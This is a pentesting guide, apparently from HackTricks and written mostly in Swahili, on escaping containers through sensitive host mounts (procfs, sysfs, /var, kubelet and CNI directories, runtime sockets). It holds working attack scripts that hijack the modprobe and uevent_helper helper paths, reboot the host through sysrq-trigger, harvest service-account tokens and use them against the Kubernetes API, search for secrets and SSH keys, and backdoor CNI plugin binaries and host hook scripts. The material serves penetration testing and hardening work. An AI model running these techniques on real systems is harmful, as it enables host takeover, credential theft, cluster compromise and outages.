# Mount za Host zenye Unyeti

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Mount za host ni miongoni mwa maeneo muhimu zaidi ya vitendo ya container-escape kwa sababu mara nyingi hubatilisha utenganishaji makini wa mwonekano wa process na kuurudisha katika mwonekano wa moja kwa moja wa rasilimali za host. Hali hatari hazihusu `/` pekee. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, hali inayosimamiwa na kubelet, au paths zinazohusiana na devices zinaweza kufichua vidhibiti vya kernel, credentials, filesystems za containers jirani, na interfaces za usimamizi wa runtime.

Ukurasa huu upo tofauti na kurasa binafsi za ulinzi kwa sababu abuse model yake inahusisha maeneo mengi. Mount ya host inayoweza kuandikwa ni hatari kwa sehemu kutokana na mount namespaces, kwa sehemu kutokana na user namespaces, kwa sehemu kutokana na coverage ya AppArmor au SELinux, na kwa sehemu kutokana na path halisi ya host iliyofichuliwa. Kuichukulia kama mada yake hufanya attack surface iwe rahisi zaidi kuielewa.

## Kufichuliwa kwa `/proc`

procfs ina taarifa za kawaida za processes pamoja na interfaces zenye athari kubwa za udhibiti wa kernel. Hivyo, bind mount kama `-v /proc:/host/proc` au mwonekano wa container unaofichua proc entries zisizotarajiwa zinazoweza kuandikwa inaweza kusababisha information disclosure, denial of service, au host code execution ya moja kwa moja.

Paths zenye thamani kubwa katika procfs ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Anza kwa kukagua ni procfs entries zipi zenye thamani kubwa zinaonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za host code-execution zinapoweza kuandikwa. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo muhimu vya reconnaissance kwa kernel exploitation. `sched_debug` na `mountinfo` hufichua muktadha wa process, cgroup, na filesystem unaoweza kusaidia kujenga upya muundo wa host ukiwa ndani ya container.

Thamani ya kiutendaji ya kila njia ni tofauti, na kuzichukulia zote kana kwamba zina impact sawa hufanya triage kuwa ngumu:

- `/proc/sys/kernel/core_pattern`
Ikiwa inaweza kuandikwa, hii ni mojawapo ya procfs paths zenye impact kubwa zaidi kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwenye payload iliyohifadhiwa kwenye overlay yake au kwenye host path iliyomountiwa mara nyingi inaweza kupata host code execution. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
Path hii inadhibiti userspace helper inayotumiwa na kernel inapohitaji kuita module-loading logic. Ikiwa inaweza kuandikwa kutoka kwenye container na ikatafsiriwa katika host context, inaweza kuwa primitive nyingine ya host code-execution. Inavutia hasa inapounganishwa na njia ya ku-trigger helper path.
- `/proc/sys/vm/panic_on_oom`
Hii kwa kawaida si escape primitive safi, lakini inaweza kubadilisha memory pressure kuwa denial of service ya host nzima kwa kubadilisha hali za OOM kuwa kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Ikiwa registration interface inaweza kuandikwa, attacker anaweza kusajili handler kwa magic value iliyochaguliwa na kupata host-context execution wakati file inayolingana inatekelezwa.
- `/proc/config.gz`
Ni muhimu kwa kernel exploit triage. Husaidia kubaini ni subsystems, mitigations, na optional kernel features zipi zimewezeshwa bila kuhitaji host package metadata.
- `/proc/sysrq-trigger`
Kwa kiasi kikubwa ni denial-of-service path, lakini ni hatari sana. Inaweza kureboot, kuleta panic, au kuvuruga host mara moja kwa njia nyingine.
- `/proc/kmsg`
Hufichua kernel ring buffer messages. Ni muhimu kwa host fingerprinting, crash analysis, na katika baadhi ya mazingira kwa ku-leak information inayosaidia kernel exploitation.
- `/proc/kallsyms`
Ni muhimu inapoweza kusomwa kwa sababu hufichua taarifa za exported kernel symbols na inaweza kusaidia kushinda assumptions za address randomization wakati wa kernel exploit development.
- `/proc/[pid]/mem`
Hii ni direct process-memory interface. Ikiwa target process inaweza kufikiwa kwa masharti yanayohitajika ya ptrace-style, inaweza kuruhusu kusoma au kurekebisha memory ya process nyingine. Impact halisi hutegemea sana credentials, `hidepid`, Yama, na ptrace restrictions, hivyo ni path yenye nguvu lakini yenye masharti.
- `/proc/kcore`
Hufichua mwonekano wa system memory unaofanana na core-image. File hii ni kubwa na ngumu kutumia, lakini ikiwa inaweza kusomeka kwa maana yoyote, inaonyesha kuwa host memory surface imewekwa wazi kwa kiwango hatari.
- `/proc/kmem` na `/proc/mem`
Hizi ni raw memory interfaces ambazo kihistoria zilikuwa na impact kubwa. Kwenye systems nyingi za kisasa zimezimwa au zimewekewa restrictions kali, lakini ikiwa zipo na zinaweza kutumika zinapaswa kuchukuliwa kama critical findings.
- `/proc/sched_debug`
Hufanya leak ya scheduling na task information ambayo inaweza kufichua host process identities hata wakati process views nyingine zinaonekana kuwa safi kuliko ilivyotarajiwa.
- `/proc/[pid]/mountinfo`
Ni muhimu sana kwa kujenga upya mahali ambapo container inaishi hasa kwenye host, ni paths zipi zimewekwa nyuma ya overlay, na kama writable mount inahusiana na host content au container layer pekee.

Ikiwa `/proc/[pid]/mountinfo` au overlay details zinaweza kusomeka, zitumie kupata host path ya container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi ni muhimu kwa sababu tricks kadhaa za host-execution zinahitaji kubadilisha path iliyo ndani ya container kuwa path inayolingana kwa mtazamo wa host.

### Mfano Kamili: Abuse ya `modprobe` Helper Path

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na helper path inatafsiriwa katika context ya host, inaweza kuelekezwa kwenye payload inayodhibitiwa na attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Kichocheo halisi hutegemea target na tabia ya kernel, lakini jambo muhimu ni kwamba helper path inayoweza kuandikwa inaweza kuelekeza invocation ya kernel helper ya baadaye kwenye maudhui ya host-path yanayodhibitiwa na attacker.

### Mfano Kamili: Kernel Recon Kwa `kallsyms`, `kmsg`, Na `config.gz`

Ikiwa lengo ni kutathmini exploitability badala ya kutoroka mara moja:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Amri hizi husaidia kujibu ikiwa taarifa muhimu za symbols zinaonekana, ikiwa kernel messages za hivi karibuni zinafichua hali ya kuvutia, na ni vipengele au mitigations gani za kernel zimejumuishwa. Athari kwa kawaida si escape ya moja kwa moja, lakini hii inaweza kupunguza kwa kiasi kikubwa muda wa kernel-vulnerability triage.

### Mfano Kamili: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikika na kufikia host view:
```bash
echo b > /proc/sysrq-trigger
```
Athari yake ni kuanzishwa upya kwa host mara moja. Huu si mfano wa kificho, lakini unaonyesha wazi kwamba procfs exposure inaweza kuwa mbaya zaidi kuliko information disclosure.

## `/sys` Exposure

sysfs hufichua kiasi kikubwa cha hali ya kernel na vifaa. Baadhi ya njia za sysfs hutumika hasa kwa fingerprinting, huku nyingine zikiweza kuathiri utekelezaji wa helper, tabia ya kifaa, usanidi wa security-module, au hali ya firmware.

Njia muhimu za sysfs ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya thermal-management na hivyo uthabiti wa host katika mazingira yenye exposure mbaya. `/sys/kernel/vmcoreinfo` inaweza ku-leak taarifa za crash-dump na kernel-layout zinazosaidia katika low-level host fingerprinting. `/sys/kernel/security` ni interface ya `securityfs` inayotumiwa na Linux Security Modules, kwa hiyo access isiyotarajiwa hapo inaweza kufichua au kubadilisha hali inayohusiana na MAC. Njia za EFI variable zinaweza kuathiri mipangilio ya boot inayohifadhiwa na firmware, hivyo kuwa hatari zaidi kuliko configuration files za kawaida. `debugfs` iliyo chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu imekusudiwa kuwa interface ya developer yenye matarajio machache zaidi ya usalama kuliko hardened production-facing kernel APIs.

Amri muhimu za ukaguzi wa njia hizi ni:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Sababu ya hii kufanya kazi ni kwamba helper path inatafsiriwa kwa mtazamo wa host. Inapoanzishwa, helper huendeshwa katika host context badala ya ndani ya container ya sasa.

## `/var` Exposure

Kumount host's `/var` ndani ya container mara nyingi hudharauliwa kwa sababu haionekani kuwa hatari kama kumount `/`. Kwa vitendo, inaweza kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na filesystems za applications nyingine zilizo karibu. Kwenye nodes za kisasa, `/var` mara nyingi ndiko kunakopatikana container state yenye umuhimu mkubwa zaidi wa kiutendaji.

### Kubernetes Example

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods nyingine na overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinajibu ikiwa mount inaonyesha data ya kawaida tu ya application au credentials zenye athari kubwa za cluster. Service-account token inayoweza kusomeka inaweza kubadilisha mara moja local code execution kuwa ufikiaji wa Kubernetes API.

Ikiwa token ipo, thibitisha inachoweza kufikia badala ya kuishia kwenye token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Token yenye RBAC pana inaweza kubadilisha `/var` iliyomountiwa kuwa compromise ya cluster nzima.

### Mfano wa Docker na containerd

Kwenye Docker hosts, data husika mara nyingi hupatikana chini ya `/var/lib/docker`, huku kwenye Kubernetes nodes zinazotumia containerd inaweza kuwa chini ya `/var/lib/containerd` au paths maalum za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa `/var` iliyomountiwa inaonyesha yaliyomo ya snapshot yanayoweza kuandikwa ya workload nyingine, mshambuliaji anaweza kubadilisha mafaili ya application, kuweka web content, au kubadilisha startup scripts bila kugusa configuration ya container ya sasa.

Mawazo halisi ya abuse mara tu yaliyomo ya snapshot yanayoweza kuandikwa yanapopatikana:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Amri hizi ni muhimu kwa sababu zinaonyesha makundi matatu makuu ya impact ya `/var` iliyomountiwa: application tampering, secret recovery, na lateral movement kuelekea workloads jirani.

## Kubelet State, Plugins, Na CNI Paths

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi huwekwa wazi kupitia DaemonSets zenye privileged access, CNI agents, CSI node plugins, GPU operators, na storage helpers. Mount hizi ni rahisi kupuuzwa kama "node plumbing", lakini ziko moja kwa moja kwenye execution path ya pods mpya na mara nyingi huwa na kubelet credentials, projected secrets, registration sockets, na executable host-side plugin binaries.

Malengo yenye thamani kubwa ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Amri muhimu za review ni:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Kwa nini paths hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua kubelet client certificates na credentials nyingine za node-local ambazo wakati mwingine zinaweza kutumiwa tena dhidi ya API server au kubelet-facing TLS endpoints, kutegemea muundo wa cluster.
- `/var/lib/kubelet/pods` mara nyingi huwa na projected service-account tokens na Secrets zilizomountiwa kwa pods nyingine zilizo kwenye node hiyo hiyo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` ni reconnaissance surface hasa, lakini yenye manufaa makubwa: hufichua ni pods na containers zipi zinazomiliki GPUs, hugepages, vifaa vya SR-IOV, na rasilimali nyingine adimu za node-local kwa sasa.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` hufichua ni CSI, DRA, na device plugins zipi zimesakinishwa, pamoja na sockets ambazo kubelet inatarajiwa kuwasiliana nazo. Ikiwa directories hizo zinaweza kuandikwa badala ya kusomeka tu, finding hiyo huwa mbaya zaidi.
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya usanidi wa pod-network. Ufikiaji wa kuandika humo mara nyingi huwa delayed host-execution primitive badala ya kuwa kufichuka kwa configuration pekee.

### Mfano Kamili: `/opt/cni/bin` Inayoweza Kuandikwa

Ikiwa directory ya host ya CNI binaries ime-mountiwa kwa read-write, kubadilisha plugin kunaweza kutosha kupata host execution wakati mwingine kubelet itakapounda pod sandbox kwenye node hiyo:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Hili si la haraka kama `docker.sock` iliyomountiwa, lakini mara nyingi huwa la uhalisia zaidi katika pods za infrastructure za Kubernetes zilizoathiriwa. Jambo muhimu ni kwamba binary iliyorekebishwa hutekelezwa baadaye na mtiririko wa usanidi wa mtandao wa host, si na container ya sasa.


## Runtime Sockets

Mounts za host zilizo nyeti mara nyingi hujumuisha runtime sockets badala ya directories kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kusisitizwa tena hapa:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Angalia [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa exploitation flows kamili mara moja mojawapo ya sockets hizi inapomountiwa.

Kama muundo wa kwanza wa mwingiliano wa haraka:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Mojawapo ya hizi ikifanikiwa, njia kutoka "mounted socket" hadi "start a more privileged sibling container" kwa kawaida huwa fupi zaidi kuliko njia yoyote ya kernel breakout.

## Writable Host Path Task Hijack

Writable host mount haihitaji kufichua `/` ili iwe hatari. Ikiwa path iliyomountiwa ina scripts, config files, hooks, plugins, au files zinazotumiwa baadaye na scheduled task au service ya upande wa host, container inaweza kubadilisha kile ambacho host executes.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Ikiwa faili linaloweza kuandikwa linachakatwa na host process, wakati wa testing weka payload rahisi na unaoweza kuonekana:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Sehemu muhimu ni **trust boundary**: uandishi hufanyika kutoka ndani ya container, lakini execution hufanyika baadaye katika muktadha wa huduma ya host. Hii hugeuza hostPath au bind mount finyu kuwa primitive ya host-code-execution iliyocheleweshwa.

## CVEs Zinazohusiana na Mount

Host mounts pia huhusiana na vulnerabilities za runtime. Mifano muhimu ya hivi karibuni ni:

- `CVE-2024-21626` katika `runc`, ambapo directory file descriptor iliyovuja ingeweza kuweka working directory kwenye host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo Dockerfiles hasidi, frontends, na mtiririko wa `RUN --mount` ungeweza kurejesha host file access, kufuta mafaili, au kupata elevated privileges wakati wa builds.
- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo bind mounts zilizotengenezwa kwa makusudi wakati wa build zingeweza kufichua `/` kwa ruhusa za read-write.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa image unpack ingeweza kuruhusu image iliyoundwa maalum kurekebisha host filesystem wakati wa pull.

CVE hizi ni muhimu hapa kwa sababu zinaonyesha kuwa mount handling si suala la operator configuration pekee. Runtime yenyewe pia inaweza kuanzisha mount-driven escape conditions.

## Ukaguzi

Tumia commands hizi kubaini kwa haraka mount exposures zenye thamani kubwa zaidi:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Kinachovutia hapa:

- Host root, `/proc`, `/sys`, `/var`, na runtime sockets zote ni findings zenye kipaumbele cha juu.
- Entries za proc/sys zenye ruhusa ya kuandikwa mara nyingi humaanisha kuwa mount inaonyesha kernel controls za host nzima badala ya container view salama.
- Paths za `/var` zilizowekwa mount zinahitaji ukaguzi wa credentials na workloads jirani, si ukaguzi wa filesystem pekee.
- Kubelet state directories na CNI/plugin paths zinahitaji kipaumbele sawa na runtime sockets kwa sababu mara nyingi huwa moja kwa moja kwenye njia ya node ya kuunda pods na kusambaza credentials.

## Marejeo

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
